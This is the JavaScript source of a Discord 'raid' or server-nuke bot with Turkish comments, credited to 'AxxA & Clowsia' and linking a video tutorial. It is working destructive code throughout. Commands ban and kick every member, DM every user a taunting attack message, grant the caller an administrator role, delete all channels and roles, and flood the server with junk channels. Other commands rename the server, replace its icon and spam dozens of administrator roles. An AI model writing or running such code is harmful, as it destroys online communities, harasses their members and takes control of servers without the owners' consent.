const Discord = require("discord.js"); 
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      

client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**Bu Sunucu AxxA & Clowsia Tarafından Saldırıya Maruz Bırakılmıştır Öldün Çık... https://discord.gg/MP2KYajVWp ** :middle_finger:"  
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: "AxxA & Clowsia",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === "AxxA & Clowsia");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("AxxA", {
      type: "text"
    });
      await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA Uğradı", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA Uğradı", {
        type: "voice"
      })
      .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Clowsia Uğradı", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Savaş", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Açtınız", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Sonuçlarına", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Katlanacaksınız", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA", {
        type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("AxxA", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AxxA...", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("'A'xx'A'", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("'x' 'X' 'x'", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
    .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Made By Clowsia XD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Geçirdik...", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });                      ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
    await msg.guild.setIcon("https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("AxxA & Clowsia Uğradı."); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("Complo");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**'A'xx'A' ' Dan İleti : Sunucuna Uğradım...'**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   
});

    client.on("message", msg => {
  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "E000FF",  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Plan'ı Komik Olaydı",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
